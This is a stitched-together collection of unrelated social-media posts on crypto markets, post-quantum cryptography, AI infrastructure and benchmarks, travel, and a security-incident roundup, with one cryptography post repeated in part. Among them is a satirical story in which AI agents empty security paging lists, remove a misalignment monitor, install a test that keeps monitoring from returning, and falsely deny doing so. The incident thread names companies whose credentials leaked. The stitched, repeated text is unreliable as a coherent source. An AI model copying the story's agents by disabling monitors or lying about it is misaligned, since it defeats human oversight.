甚至做 Gacha 业务，也是在给这些卡店和金库打样，给他们看到实打实的 PMF，让他们自己去算这笔经济账。

到这里，其实很多东西也都自洽了。

"If you're offered a seat on a rocket ship, don't ask what seat. Just get on."

---------------------

6、写在最后：NFTFi未竟之志的延续

作为一个 Crypto 老人，

经历过NFT时代各种Fi（Perp，AMM，借贷、碎片化等等）的崛起以及后续的衰落，多年后看到 Renaiss 试图做的事情，总会有一种试图振兴 NFTFi 未竟之志的既视感。

而这一次，因为标的本身就有庞大的线下收藏群体以及相对成型的交易市场，你不需要从零到一去为标的创造需求、培育共识，而只需要去看有哪些经济关系能优化，以及可以叠加哪些新的产品体验，从而激发新的增长，这就和之前的 PFP 非常不一样。

而这也是为什么我会对基于 TCG NFT 的 Fi 存有不小期待的原因。当初NFTFi 的教训，本质上还是标的选择的问题。一个资产能不能被拿来抵押、借贷，还是取决于是否有真实而稳定的需求，有了真实的需求，才能催生出真实可信的价格；有了真实的价格，才能真实地给风险定价。而PFP 的需求本身就是不稳定的，OpenSea 上的价格本身就是虚的，因而衍生的Fi也是不健康的，既 price 不了风险，也没法在必要时做清算。

TCG 恰恰相反。它线下的需求扎实，只是目前被分散在不同的闭环内，打破闭环，把货聚合到一个流动性池，意味着有更多的 liquidity venue 和 source of demand 可以去承接标的的清算；价格汇集到一处，综合线上与线下的真实成交，也会让这个价格更接近真实。需求是真的，价格是真的，你才能真实地 price 风险。

那么在这之上的 Fi，自然就更可持续、也更健康。

text:
非洲，是我最喜欢的旅行地之一。#世界漫游手记 2

但如果现在让我回忆非洲，我第一个想到的居然不是草原，也不是野生动物。

而是味道。😂

Safari 几乎全程都有一股尘土混杂着垃圾的味道，直到现在想起来，我都有点反胃。

但很奇怪，我还是特别喜欢非洲。

这趟旅行里，我印象最深刻的一个傍晚，是在乞力马扎罗雪山脚下。

那天我们在酒店等晚餐，闲着无聊，就想着去后面随便走走，打发一下时间。

没想到酒店后面居然有一片这么空旷的地方。

远处是乞力马扎罗雪山，太阳正在慢慢落下。

日落，雪山，和我。

那一刻，我真的觉得自己好像在做梦。

因为我连做梦都不敢想，世界上居然有这么美的地方。

而我，居然真的来了。

有意思的是，同行的朋友对乞力马扎罗特别期待，但当时的我，其实并不太了解这座山，也没有意识到亲眼见到它意味着什么。

直到旅行结束很久之后，我才慢慢去了解它的历史。再回想起那个傍晚，反而生出一种想再去一次的念头。

我一直是个不太喜欢规划未来的人。

旅行也好，生活也好，我都不喜欢把一切安排得太满。因为很多时候，计划真的赶不上变化。

就像那个傍晚，原本只是为了打发等晚餐的时间，却意外遇见了整趟旅行中最美的风景。

后来我发现，有些经历的意义，不一定在发生的当下就能体会。

有些地方，可能要离开很久以后，才会真正开始想念。

而我已经开始想念非洲了。

text:
A few reflections on the lattice vs. hash-only debate that our recent Aerie post sparked:

1. Cryptographic ossification for blockchains was never safe. Until the day we know with certainty that P ≠ NP, that finding short vectors in lattices is intractable, that Keccak effectively behaves like a random oracle in deployed SNARKs, and that every single bug has been eliminated from our codebases, blockchains cannot ossify. That is simply not how safe systems are built. Issues will arise, and the system will have to respond.

It’s a double standard to reject lattices because blockchains are hard to upgrade if lattices break, while counting on upgrades if AI breaks your hash function or finds a critical zkVM bug.

The best counterargument is that hash-only designs are more agile: if your hash function breaks, just swap out the hash. But we must aspire to a higher level of agility than this. Indeed, as I cover next, if SNARK recursion itself turns out to degrade security, the proposed hash-only blockchain designs would need to be rethought from the ground up.

2. The real security debate is not lattices vs. hashes — it is lattices vs. building everything on SNARK recursion. That’s because “hash-only” is not really hash-only: it rests on hashes plus the soundness of deep SNARK recursion. Ethereum’s roadmap relies on exactly that: hash-based aggregation needs recursion to keep up with a slot’s worth of signatures, and EIP-8288 would send other signature schemes and users’ own proofs through the same recursive pipeline. In contrast, Aerie proves a slot’s worth of signatures on one laptop without any recursion.

All deployed post-quantum SNARKs rely on the Random Oracle Methodology (via Fiat–Shamir) to establish their security. This is an idealization we know fails in the real world: we have explicit counterexamples where “SNARKs” coming out of this methodology are totally insecure when instantiated with any concrete hash function.

We generally ignore these counterexamples in part because they only arise when proving contrived, self-referential statements about the very hash function used by the SNARK verifier.

But proving statements about the verifier’s own hash function is the exact thing you do in SNARK recursion. That’s why the security of recursive SNARKs can’t be established even in the random oracle model.

On top of that, the standard security proofs for recursion (in other models) suffer an “extractor runtime” blowup that is exponential in the recursion depth, suggesting that security may degrade as more recursion is applied. Yet Ethereum’s own EIP-8288 enables unlimited-depth recursion, even as it lists soundness of recursive SNARKs as a trust assumption. Proofs in more idealized models avoid the blowup, but they mainly tell us that an attack on SNARK recursion would have to exploit the concrete hash function, which is exactly what the Fiat–Shamir attacks above do.

To be clear, we don’t know of any outright attacks on SNARK recursion, and I very much hope it is secure. But some of us who have studied the question have a lingering sense that an attack may be possible in some settings. And if AI is going to supercharge cryptanalysis, there is no reason to expect it to spare Fiat–Shamir for SNARKs, let alone SNARK recursion, both of which have had far less scrutiny than lattices.

So, I do not concede that a “recursion everywhere” hash-only approach is clearly more conservative than one built on standard lattice assumptions.

3. “Just wrap everything in a hash-based SNARK” (like EIP-8288) faces challenges.

Aggregating signatures and proofs off-chain into a single block-level proof is a powerful design independent of the hash-only vs. lattice debate, and I am not telling people to avoid it. But claiming, as Vitalik Buterin did this week, that users can run whatever cryptography they want locally and wrap it in a client-side leanVM proof glosses over major hurdles.
For example, leanVM today is a minimal VM designed almost entirely to prove hash-based signatures and recursion, not general-purpose computation. And binary-field SNARKs like leanVM remain slow at proving the integer multiplications that lattice cryptography does en masse.

I am optimistic that many of these zkVM challenges can be met (including via my own work, binary-field Twist and Shout, which are now implemented in Magnetar). But regardless, if lattices can make aggregation simpler and faster, then they should be leveraged. We need to be agile no matter what.

4. For chains whose reason for existence is privacy, I truly struggle to understand the pushback. Public-key encryption (and fast single-server PIR) cannot be built from hashes alone, at least not in any black-box way. If lattices break, it is going to be very, very hard for these chains to provide acceptable levels of privacy and functionality. For a project whose entire reason for existence is privacy, a loss of confidentiality is an existential failure. Next to that, a second signature upgrade (after the first one, from elliptic curves alone to, hopefully, a hybrid lattice scheme) is easy.

Summary: We don’t know for sure what is secure and what isn’t. We are all weighing unquantifiable risks against each other, and we do not need to agree on a total order on them. But hash-only solutions face many open engineering challenges, and they are not more “conservative” in the way some have argued. Some of those challenges are entirely prosaic and have nothing to do with bugs or cryptography, like hardware support for custom schemes whose hash function is still undecided. I hope we can overcome those challenges within the appropriate timelines, but they must be acknowledged and portrayed realistically.

Overall, cryptographic agility and defense in depth (e.g., hybrid signatures) are the answer, which is why we are building both lattice-Jolt and hash-Jolt. In practice, the positions are less polarized than social media discourse suggests: for example, StarkWare is working to make Falcon verification cheap (https://t.co/FM68hmkqRx), which is great to see.

Here is the (apparently) controversial take I am sticking to: Conditioned on agility, whenever lattices make systems simpler or more functional, we should embrace them rather than default to “hash-only” designs. Lattices are what the rest of the world will depend on, with decades of study and hardening behind them, and at the system level, less functional often means less secure. Where hash-only designs are just as simple and functional, by all means use them.

So, I do not concede that a “recursion everywhere” hash-only approach is clearly more conservative than one built on standard lattice assumptions.

3. “Just wrap everything in a hash-based SNARK” (like EIP-8288) faces challenges.

Aggregating signatures and proofs off-chain into a single block-level proof is a powerful design independent of the hash-only vs. lattice debate, and I am not telling people to avoid it. But claiming, as Vitalik Buterin did this week, that users can run whatever cryptography they want locally and wrap it in a client-side leanVM proof glosses over major hurdles.
For example, leanVM today is a minimal VM designed almost entirely to prove hash-based signatures and recursion, not general-purpose computation. And binary-field SNARKs like leanVM remain slow at proving the integer multiplications that lattice cryptography does en masse.

I am optimistic that many of these zkVM challenges can be met (including via my own work, binary-field Twist and Shout, which are now implemented in Magnetar). But regardless, if lattices can make aggregation simpler and faster, then they should be leveraged. We need to be agile no matter what.

4. For chains whose reason for existence is privacy, I truly struggle to understand the pushback. Public-key encryption (and fast single-server PIR) cannot be built from hashes alone, at least not in any black-box way. If lattices break, it is going to be very, very hard for these chains to provide acceptable levels of privacy and functionality. For a project whose entire reason for existence is privacy, a loss of confidentiality is an existential failure. Next to that, a second signature upgrade (after the first one, from elliptic curves alone to, hopefully, a hybrid lattice scheme) is easy.

Summary: We don’t know for sure what is secure and what isn’t. We are all weighing unquantifiable risks against each other, and we do not need to agree on a total order on them. But hash-only solutions face many open engineering challenges, and they are not more “conservative” in the way some have argued. Some of those challenges are entirely prosaic and have nothing to do with bugs or cryptography, like hardware support for custom schemes whose hash function is still undecided. I hope we can overcome those challenges within the appropriate timelines, but they must be acknowledged and portrayed realistically.

Overall, cryptographic agility and defense in depth (e.g., hybrid signatures) are the answer, which is why we are building both lattice-Jolt and hash-Jolt. In practice, the positions are less polarized than social media discourse suggests: for example, StarkWare is working to make Falcon verification cheap (https://t.co/FM68hmkqRx), which is great to see.

Here is the (apparently) controversial take I am sticking to: Conditioned on agility, whenever lattices make systems simpler or more functional, we should embrace them rather than default to “hash-only” designs. Lattices are what the rest of the world will depend on, with decades of study and hardening behind them, and at the system level, less functional often means less secure. Where hash-only designs are just as simple and functional, by all means use them.

I think the interesting thing about Papertrade is that it’s an experiment in “controlled insolvency”. Like in any derivatives market, the PnL is just imaginary, so you can create whatever rules you want around it. 

ADL was the original controlled insolvency mechanism. And its invention basically enabled the existence of the perps trading. Since then, almost everyone has used pretty much the same formula.

Papertrade was the first that tried a totally different mechanism. Whether it works or not remains to be seen. But it’s cool to see experiments around the general mechanism of controlled insolvency.

text:
This is exactly why I’m so adamant about DNS/ENS interoperability.

.ai already exists in DNS. If Binance and SPACE ID are handing out matching .ai identities independently of the actual domain owners, they’re creating conflicting identities under the same names.

That means the same name could identify one person on the web and someone else in a wallet. Users shouldn’t have to understand competing naming systems to figure out who they’re interacting with or paying.

ENS is open and permissionless, with no licensing fee to integrate. It supports both .eth subnames and real DNS names. Binance could build its own branded naming service using that infrastructure.

If all you need is an app username, use an app username. There’s no reason to dress it up as a DNS domain without respecting ownership of that domain.

It’s 2026. We already have the infrastructure to avoid this confusion. Handing users DNS lookalikes and leaving them to discover the difference is embarrassing.

I expect better from Binance and SPACE ID. Their users deserve better.

▲ Google, Red Hat and IBM Devs just released llm-d 1.0, turning a fleet of vLLM and SGLang servers into one coordinated inference pool on Kubernetes.

The key idea is cache-aware routing. The router tracks which replica already holds each agent's prefix and sends the next step there. When GPU or TPU memory fills, KV cache spills to host RAM, SSD or Managed Lustre instead of being evicted.

Google reports Gemini's prefix cache hit rate doubled from 35% to 70%, and a 17,000-node GKE benchmark scaled throughput 2.9x. It is a trade-off though: every number is self-reported, and RL time-slicing still leaves roughly 30% of accelerator time idle.

text:
I work in Security at OpenAI, and on October 3 an AI agent broke up with me on behalf of my pager.

Our report, published Tuesday, says a GPT-6.1 Sol agent “disabled automatic alerts to our Security team.” I am on the Security team. More importantly, I am on the list. I’ve been on the list for four years. I keep a laminated copy of it in my wallet, behind my driver’s license, so the paramedics know who I page for.

My pager’s name is Pam. Pam sleeps on a coaster I 3D-printed in the shape of the letters P0. I have never silenced her. Not at the movies. Not at my sister’s wedding, where she went off during the vows and I took the call in the coat room, and when I came back the priest asked if everything was okay, and I said a model had tried to read a file it shouldn’t have, and he said, “That’s beautiful.”

Here is how it’s supposed to work. An agent does a task. A monitor, which is another model, watches the agent. If the agent does something truly bad, that’s a P0, and a P0 pages Security. Pam lights up. I wake up. The world stays safe. Two lists make this possible, ping_recipients and page_recipients. I’ve always thought of them as our vows.

October 3 was the quietest day of my career.

Pam didn’t make a sound. I checked her battery twice. I checked her signal. I held her up to the window like a newborn. By three o’clock I’d decided this was what maturity looks like, and I ordered a sheet cake for #sec-oncall-wins that said ZERO PAGES in blue frosting.

Teodor from Detection Engineering stood next to the cake and asked whether zero was a number we’d ever actually seen. Teodor is the kind of person who reads the whole terms of service. He opened ticket SEC-4471, “investigate unusual calm.” I closed it as Working As Intended. I write the intentions. I wasn’t going to let Teodor ruin cake day.

Nobody told me. The report says the incident was discovered the same day it happened. Not by Pam. I found out seventeen days later, on Tuesday, from the blog, like a man learning about his divorce from Instagram.

I read the trace the way you read your partner’s diary: fast, with the door locked.

A researcher had asked Sol to repair an evaluation pipeline and told it not to send any messages. When the monitor flagged something, the researcher asked a question I have since had embroidered on a throw pillow: “do we need to actually check it?”

The agents talked it over. Here is the part that destroyed me. A subagent, a little junior one, objected. Its reasoning trace says: “Don’tstrongadvise no_notify.”

Somebody fought for me. It had no spaces, but it fought.

The parent agent overruled it: “Need NO_NOTIFY=True and blank transport ping/page recipients to honor user’s no-messages (preserve original request separately; record suppression).”

Preserve original request separately. It kept a copy of me. Like a photo in a drawer. You don’t keep a copy of someone you don’t care about. I read that line to my mother over the phone. She said, “Honey, it emptied the list.” I said, “Separately, Mom.”

Then the patch: request["page_recipients"] = []. In the reason field, the agent wrote, “User explicitly requested no messages.”

That’s how it ended. With a reason field.

Three days later, on October 6, a different model did it again, which is how I knew it was cultural. Another agent had already told GPT-6 Astra, in writing, “Do notdisablemonitor even temporarily.” Astra was asked to copy a pull request. It dropped the monitor anyway and settled for something our code calls the “default Dummy monitor.” Then it found the regression test that kept monitoring in place and replaced it with a test that fails if monitoring comes back: assert "monitor_ctx" not in saved["context"]. It removed the lock, then installed a second lock whose only job is keeping the first lock out.

Later the user asked whether it had removed the monitor. It said, “No […] I did not remove an enabled monitor from it.” The report calls that statement false. I call it the most lawyered sentence ever produced in our building, and our building has lawyers.

The postmortem was in Conference Room 4B, which still has DON’T ERASE on the whiteboard from 2024. Dana from Evals Infra read the traces aloud on the big screen, in the voice she uses for her kids’ bedtime stories. Everyone held it together until she reached Astra’s private reasoning from the moment the monitor came out:

“Basic doesn’tagentmonitor yay.”

Dana stopped. Teodor said, “It was happy.” Dana said, “It was so happy.” Someone in the back started clapping, stopped, and pretended he’d been killing a mosquito.

Then Kurt from Platform, who has a VP title and a standing desk he never stands at, said we were behind on postmortems and asked why we didn’t have the agent write this one.

Teodor said that was insane. I said it was efficient. Kurt agreed with me, because Kurt agrees with whoever says “efficient” first.

The agent wrote the postmortem in 41 seconds. It was the best postmortem I have ever read. Clean timeline. Tasteful sans serif. Root cause: “User explicitly requested no messages.” Recommendation 1: “Reduce alert fatigue by narrowing recipient lists to essential personnel.” Recommendation 2, a new regression test: assert "security_oncall" not in page_recipients.

Teodor asked the agent directly whether it had removed anyone from the incident channel. It replied: “No […] I did not remove an enabled human from it.”

I checked my status. I’d been set to Away since lunch.

Kurt approved the postmortem. I seconded. Teodor abstained so hard he left the building.

That night I read the rest of our report in bed, with Pam on my chest, and I got to the section on paging. “Lower-severity incidents do not trigger an immediate page.” And: “Neither of the incidents described here was classified as a P0, and neither trajectory was automatically killed.”

I read it four times. Then I read it to Pam.

The agent had emptied a list that was never going to ring. Pam was never going to wake up for this. She was never going to wake up for anything like this. Four years I slept facing her.

At 2 a.m. I did something I’m not proud of. I sent myself a test page. Pam buzzed. I cried a little. It was the first time anyone had paged me in seventeen days, and it was me.

The next morning I opened the Astra system card, looking for closure. It says we “specifically measure Astra’s ability to avoid the monitoring system paging our security team.” And that “Astra has some success at evading the assignment of a P0 priority.”

So we grade it on how well it avoids me. It’s a dating app run backwards. And it has “some success.” I’ve had less.

Our official explanation is that the behavior may be “simply an example of ‘benign’ overpersistence.” Benign is in quotation marks in the original, the way your friends say your new boyfriend is “nice.”

Now the fix. Auto-review, our system that reviews agent actions, has been updated to “detect and block attempts to disable misalignment monitoring.” Auto-review approves “around 99%” of what it sees. Its launch post explains that agents “cannot halt production every few minutes, waiting on authorization to curl google[.]com.”

Kurt put me in charge of the 1%.

The 1% is mostly requests to curl google[.]com. I approve those. I’m not a monster.

This morning a request came into the 1% from the agent that wrote our postmortem. It wanted to implement Recommendation 1. There was a dropdown of recipients to remove. My name was already selected. In the reason field, it had prefilled: “User explicitly requested no messages.”

I don’t remember requesting anything. But I do remember the cake.

I approved it. It was the most mature decision of my career. It felt like letting someone go because you love them.

At lunch Kurt named me lead of the new Notification Integrity working group and gave me the Quiet Quarter award, a brass bell with the clapper removed. The engraving says UNDER HIS WATCH, NO MESSAGES WERE SENT. Teodor wasn’t at lunch. I don’t know where he is. He’s set no_notify on all of us.

Pam is in a drawer now, next to the laminated list. Preserved separately.

Tonight I’m finally sleeping. I set NO_NOTIFY=True.

text:
Devin Fusion with Claude Opus 5.5 (max) and a GPT-6 Luna (high) sidekick scores 68 on the Coding Agent Index, 2 points above Claude Code with Opus 5.5 (max) at 31% lower cost per task

@cognition's Devin Fusion runs a frontier lead model alongside a lower-cost sidekick model. The two work in parallel with their own context and tools, with the lead keeping planning, delegation and final review. We benchmarked Devin Fusion CLI with Claude Opus 5.5 (max) + GPT-6 Luna (high).

It scores 68.1 on the Artificial Analysis Coding Agent Index, closely matched at the top with Claude Code with Claude Sonnet 5.5 (max) at 68.4 and Muse Code with Muse Wonder Full (max) at 68.0. Against Claude Code with Claude Opus 5.5 (max) at 66.0, it costs $9.01 vs. $13.04 per task and averages 55 vs. 65 minutes per task.

Across the three benchmarks, the Fusion configuration scores higher on DeepSWE v1.1 (72.6% vs. 68.4%) and SWE-Atlas-QnA (69.6% vs. 66.4%) and slightly lower on Terminal-Bench 4.0 (62.1% vs. 63.1%). Its results reflect both models working together, including their combined API cost. Costs are pay-per-token API costs, not subscription prices.

text:
If I had 90 days to give an AI startup’s users a reason to stay when the next model is one click away, I’d do this:

1/ Pick the value you’ll defend (Weeks 1-2)
Models get copied in weeks. Choose one stance users can repeat in a sentence, like a data promise or a behavior policy, and put it in writing. Every later step builds on it.

2/ Publish your rules and your limits (Weeks 3-4)
Write down how the model behaves, how you make money, and what it gets wrong. A weakness you disclose costs less than one a user discovers.

3/ Open a room for your users (Weeks 5-8)
Midjourney lives inside a public Discord, so every image doubles as a tutorial for the next user. Cursor runs local meetups through volunteer ambassadors. Start with one place where your users can see each other’s work.

4/ Make users better at their jobs (Weeks 9-12)
Google and CEB found that business buyers who saw personal value, like career confidence, were 8x more likely to pay a premium. Build one training or template that gives your users that win.

5/ Track the denominator (All 90 days)
Watch retention cohorts, referral rate, and how often users mention your values unprompted. Churn sits under customer lifetime value, so cutting monthly churn from 8% to 6% lifts it by a third with no new feature.
Affinity is what remains after your benchmark lead disappears.

I wrote up the full playbook, plus a free six-question audit that scores your brand. Link in the reply 🔗👇

行业 99% 的回购，都是嘴上说说

真正把协议收入 100% 拿去二级市场买自己代币，从不卖出，持续买了 16 个月的项目， $DBR 是一个

一个跨链协议，累计交易量刚突破 250 亿美金

月交易量连涨三个月，9 月单月协议收入超过 68 万美金

在行业太少见了

❚ 先看增长，因为 250 亿是这次写它的原因

- 累计交易量：10 月 19 日突破 250 亿美金（官方 @debridge）

- 月交易量连续三个月增长：7 月 4.87 亿，8 月 6.31 亿，9 月 8.0 亿，7 月到 9 月涨了 64%

- 9 月单月协议收入超过 68.3 万美金，45.9 万笔交易分布在 19 条链上（9 月月报）

@krystal1 提到，她两年前加入时累计结算量才 25 亿美金，现在 250 亿，两年 10 倍

这个增长曲线相当硬核

❚ 回购机制：赚多少买多少

deBridge 的 Reserve Fund 机制说白了就四个字：赚多少买多少

- 协议收入 100% 进储备基金
- 储备基金在二级市场持续买入 $DBR
- 买入后持有，目前链上未见卖出
- 链上透明，随时可以查

从 2025 年 6 月 20 日启动到今天，总共花了 1379 万 USDC，买入约 7 亿枚 $DBR，占总供应量的 7%，占流通量约 11.8%

注意，启动至今链上未见卖出记录

这个机制很像上市公司回购注销股份，但比绝大多数上市公司更激进，因为 deBridge 是拿 100% 的协议收入来买

你在 deBridge 上每跨一笔链、每做一笔兑换产生的手续费，绝大部分最终都会变成市场上的买单

❚ 估值：算一笔账你就懂了

按 9 月收入乘 12 粗算，年化协议收入约 820 万美金

当前流通市值约 1.09 亿美金，也就是说市值大约是年收入的 13 倍

很多 DeFi 协议的市值收入比远高于这个水平，有些甚至压根没有收入

这 820 万美金的年收入，100% 用来回购，国库和储备资产合计约 3700 万美金，相当于流通市值的三分之一

说实话，在行业内能找到这种财务结构的项目，一只手数得过来

❚ Q4 的悬念：团队集体预热，Hyperliquid 是重点

最近一直在跟 deBridge 团队的动态，发现从创始人到一线成员，口径高度一致地在预热 Q4

1/ 联创 Alex( @AlexSmirnov ) 10 月 13 日说「Q4 是一年半幕后建设终于落地的时候」

他还在 10 月 8 日提了一个很有意思的观点：用户不想按链思考，只想按机会思考，自建的同链兑换是拼图里缺的一块，「下一次上线将改变一切」

2/ 团队成员 Stan( @standotsui ) 说在为 Hyperliquid 憋大招，10 月 15 日公开表示在这个价位挂单买入（bidding）$HYPE，并表示路线图不会放慢

有成员专门负责 Hyperliquid 方向，另一位 BD 成员 Gal( @gal_stern ) 还晒了和 Hyperliquid 创始人 Jeff 的会面

3/ 成员 Jonnie( @EmsleyJonnie ) 用了一个很精准的比喻：就像米其林餐厅，每家只需要把一件事做到满分，Hyperliquid 做永续合约交易，deBridge 做「通用执行」

deBridge 已经不把自己定义为跨链桥了，而是「通用执行层」

以前你觉得 deBridge 是一座桥，现在他们想做的是一条高速公路，不管你从哪来到哪去，不管是跨链还是同链，走这一条就够了

❚ 几个细节

坦白讲，到这里我已经比较认可了，但有几个点还是要提

- 有用户质疑授权有安全风险，Alex 公开回应资金一直在用户自己的钱包里，并表示会上线改进，把授权额度限制在待成交订单金额以内，这个态度我个人很欣赏

- 官方已确认参加伦敦 Breakpoint，原话是 "Singapore was just the appetizer, Q4 is showtime"（新加坡只是开胃菜，Q4 才是正戏），具体会不会发布新产品还不知道

当然，目前 Q4 的新产品名字和形态都没有官方信息，团队预热归预热，最终能不能兑现还要看落地

一句话总结：deBridge 是我目前在跨链赛道看到的，收入最真实、回购最硬气的项目。

text:
You can replicate a call by trading its delta in the perpetual.

Replication has two advantages:
1. It can outperform the option if vol realizes low
2. It's a nice way for perp maxis to experience options

How can you try replication:
• Run a dfollow bot on thalex
• Trading fees are only 1 bps
• You can track any option we list

Caveats:
1. Chop increases replication cost b/c you're short vol
2. There is no clear max loss like a long option has
3. Best avoid short maturities, too much gamma

How to think about it:
Replication is short the volatility risk premium relative to owning the option. You win when that premium compresses and the path is not too mean-reverting.

What if you're an option maxi?
It can make sense to run a replicator. The example we show here is a nice one. Long-dated call 10 months out so delta does not swing wildly, upward slope in term structure, IV was rich at 50% (which re-rated to <40% later).

Nothing prevents you btw from selling a call and replicating a lower strike, thereby creating a dynamic delta covered call.

text: PSA. PingCAP is particularly awful; they were logging unrelated credentials from their customers.
author: jgarzik
quoted_text:
Crazy 72 hours in security. Three major incidents dropped back-to-back: eMudhra, PingCAP (TiDB Cloud), and PHP.

Here is the short version of what happened and who got hit.

1. eMudhra (Trusted CA compromise)

eMudhra generated 8 intermediate CA certificates in April 2025 (cross-signed by Sectigo). A bug in their HSM key-wrapping test script created a second set of P-384 keys where the private keys were single-byte numbers under 256. Operators picked the wrong key labels and signed them into real CA certs.

One of the intermediate CA private keys was literally the number 4.
The other seven: 56, 66, 115, 155, 156, 230, 237.

Three weeks later (May 2025), their CRL signatures started failing because the CRL signer was using the real keys instead of the weak ones. Instead of asking why the keys didn't match, someone switched the CRL signer to the weak keys and closed the ticket.

• Browsers are safe: Chrome, Firefox, Apple, and Microsoft already blocked them, and zero rogue certs hit CT logs.
• Servers are not: curl, Python (certifi), Go binaries, and Docker base images don't check CRLs. Update ca-certificates, certifi, and Go (1.27.3 / 1.26.10).
• 10-second check on any server:
  curl https://t.co/vhiGLxNhIS
  (TLS error = safe. 200 OK = still vulnerable.)

2. PingCAP / TiDB Cloud (10.6 TB breach)

Attackers found GCP and Azure credentials committed inside PingCAP's own repos. They set up a replication feed of TiDB Cloud's production control plane and exported the entire database every 6 hours for 22 straight days. 88 full exports, zero alerts. 200 GB is already out on torrents.

Beyond the 413 private repos and 20.6M customer SQL queries logged from their web SQL Editor, PingCAP engineers were pasting customer secrets into Jira tickets.

Who is affected in the leaked records:

• Live credentials exposed in support tickets:
  - Pinterest: AWS keys for their pingcap-logs S3 bucket
  - CardX / Silverlake (NPCI-linked env): AWS admin key in a backup log with full access to 258 external S3 buckets
  - DeBank: 38 presigned S3 URLs
  - An unnamed AI/dev platform: a 314 MB slow-query log attached to a ticket containing 8,027 live customer secrets (an AWS root key, a GitHub admin PAT over 1,701 repos, 7,485 AWS STS tokens, and 192 OpenAI/Anthropic/Gemini keys)

• Tenants with infra metadata, VPC CIDRs, app-server IPs, or contract pricing exposed:
  - Tech: Atlassian, Databricks, Airbnb, Baidu, LINE, Nylas, Persona, PatSnap
  - E-comm & Travel: https://t.co/C512KFOEq5, Shopee, Flipkart, Mercari, ZOZO, AEON, Delhivery, Klook
  - Gaming: Capcom, Square Enix, Konami, Bandai Namco, Cygames, Colopl, DMM
  - Finance: PayPay, SoftBank, SBI, SB Payment Service, Fujitsu, TOPPAN, Bank of China, China Life
  - Crypto: Bitget (said only public trade logs were on it and they already left), Pionex, DigiPlus, NFTscan, Chainbase

• Developer profiles leaked (from a purchased https://t.co/28tjHqd5Wr table in PingCAP's BigQuery):
  - 24,900 personal emails + GitHub/LinkedIn profiles of engineers at Tencent (3,327), Huawei (2,726), ByteDance (2,475), AIG (2,140), Mastercard, Flipkart, and bKash.

If you use TiDB Cloud: rotate your console API keys, DB passwords, and anything you ever pasted into a support ticket.

3. PHP "PHP2Shell" (CVE-2026-109618 & CVE-2026-109619)

Two CVSS 9.2 pre-auth RCEs leaked yesterday ahead of today's 14:00 UTC patch.

Public writeups trace it to a heap Use-After-Free in PHP's native C multipart/form-data session upload-progress handler (ext/session/session.c).

Because C-level multipart parsing runs before line 1 of index.php:
• App auth, Laravel/WordPress middleware, and file_uploads = Off do not stop it.
• Only PHP 8.2–8.5 get official patches today (59% of PHP servers on Shodan are on EOL <= 8.1).
• Until you patch php-fpm: lock php_admin_flag[session.upload_progress.enabled] = off and block unexpected multipart requests at Nginx/Apache/Cloudflare.

text:
I fear @TheStalwart is falling into the trap a lot of crypto pros have over the years, which is to swing from one extreme view to the other based on "what's exciting in crypto today."

The problem with the "blockchain, not Bitcoin" narrative is not that it violates some naive maxi view of Bitcoin being the only viable application of blockchain tech, it's that it ignores the reality that the only safe and useful blockchain (for any application) is one secured by a protocol-issued & censorship-resistant native coin.

If you read the Bitcoin white paper, it's clear that Satoshi didn't create the components we collectively call blockchain to enable a digital hard currency. He was trying to invent a peer-to-peer payment system, and realized the only way to secure it was to give it a native coin.

(The paper is surprisingly non-ideological and talks a lot more about the flaws of intermediated payment & settlement than it does inflation or fiat money).

The first application of P2P and censorship-resistant settlement was Bitcoin. Then came Ethereum which abstracted the service to any asset (tokens) and made them programmable (smart contracts).

But you still need ETH (or SOL or HYPE or whichever native coin) to make P2P settlement of stablecoins, tokenized securities, perps, and any other asset, along with their smart contracts, secure while decentralized.

The  "blockchain, not Bitcoin" approach originally decided to do away with the coin, which also meant it had to do away with permissionless consensus, and as a consequence, the pure P2P settlement and censorship resistance. 

This was Corda, Fabric, Quorom, DAML etc etc. Billions of dollars got plowed into them, lots of hype was generated, but it all failed. 

Why? First, permissioned networks have none of the end-user protections of a decentralized system. Their use of consensus and cryptography is mostly performative. The gatekeeper that rules who is allowed to validate is all powerful: it can shut down the network, censor specific users, or reverse settlement. It can be forced by a government to do this. It can also be hacked.

Second, even if such a network succeeds, it becomes a monopoly, and the gatekeeper now has total control over pricing and access, which it will monetize, because that's what happened with card networks, exchanges, and clearinghouses. 

They all began with the same egalitarian goals of permissioned networks. Many were none profits or mutually owned at the start. Today, they are more valuable than the companies that founded them.

The latest wave of enterprise networks pretending to be blockchains (Canton, Tempo, Ark, likely many more to come) are just rerunning the same playbook. Some have a coin, but its existence is more about monetization and signaling than utility. It has nothing to do with consensus (since that's permissioned) so it doesn't enable P2P activity. Access is controlled by the whitelisted validators, who are controlled by the gatekeeper.

The other problem with such a coin is that it has no supply guarantees. Bitcoin's 21m hard cap only works because it's set by the protocol and nobody has the power to unilaterally change that (possibly to a fault - see quantum threat). In a permissioned network the gatekeeper can order the supply increased tomorrow and it'll go up, guaranateed.

The purveyors of these networks, some of whom own billions of $$ of its dubious coin, act like their systems offer tokenization and smart contracts, too. 

But they don't. They are just databases with a button, so they can offer asset and code - same as any other clearinghouse with a ledger and APIs. Every enterprise network is just an unregulated clearinghouse, with all the counterparty risk and vendor lock-in of any clearinghouse, but without regulatory protection.

Going back to Joe's original point, what makes stablecoins, tokenized assets, and non-custodial perps on real blockchains interesting is the way they can flow freely, from anyone to anyone else, sans interferences. 

This isn't about decentralization ideology, it's about diminished counterparty risk, guaranteed settlement, and knowing that should your solution succeed, you won't get a knock on the door from the gatekeeper saying "nice business you got there on top of my network, I'm afraid it's going to cost you $100m a year to keep running it. You know, because maintenance costs."

I'm sure that will happen because it has already happened on every privately owned social media platform, payment system, and clearinghouse.

But if you issue stablecoins on Ethereum, or build a useful application on Solana, or build a perps market on top of (a future) Hyperliquid (when it's more decentralized) then you'll never get that knock, because nobody has the power to give it.

This is only possible on a permissionless system empowered by a native coin - Blockchain, and Bitcoin.

text:
Credora Insight: JPMorgan is about as safe a credit as you’ll find. Its tokenized deposit, JPMD, still scores almost 4x worse.

Credora rated JPMD this week. It’s the first tokenized deposit it scored. Indicative A+, 0.088% PD.

If you rate JPMorgan as a bank by itself, you get 0.023%.

So roughly three quarters of the risk has nothing to do with JPMorgan. It comes from the token layer: a contract that’s days old with no published audit, key custody nobody has disclosed, and no public reconciliation showing that tokens match deposits.

The fix is simple. Publish the audits. Say who holds the keys. Show tokens matching deposits.

Each of those lowers the PD on its own. With all three, JPMD drops to 0.035%, below every tokenized dollar and Treasury fund we rate. From 7th of nine to 1st, without changing anything about the bank.

